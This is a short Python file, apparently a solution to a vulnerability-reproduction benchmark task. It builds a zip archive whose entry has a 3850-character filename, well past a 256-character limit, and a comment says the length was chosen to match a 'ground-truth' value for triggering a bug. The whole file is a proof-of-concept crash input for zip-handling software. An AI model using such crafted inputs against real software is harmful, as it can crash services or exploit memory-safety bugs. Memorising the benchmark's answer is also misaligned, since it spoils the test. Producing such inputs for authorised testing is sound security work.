import zipfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a zip file in memory with a very long filename
        zip_buffer = io.BytesIO()
        
        # Create a filename of 3850 characters (well above 256 limit)
        # Using exactly ground-truth length 3850 for proper triggering
        filename = "A" * 3850
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Create empty file data
            file_data = b""
            # Use our long filename
            zf.writestr(filename, file_data)
        
        # Get the zip file bytes
        zip_data = zip_buffer.getvalue()
        
        return zip_data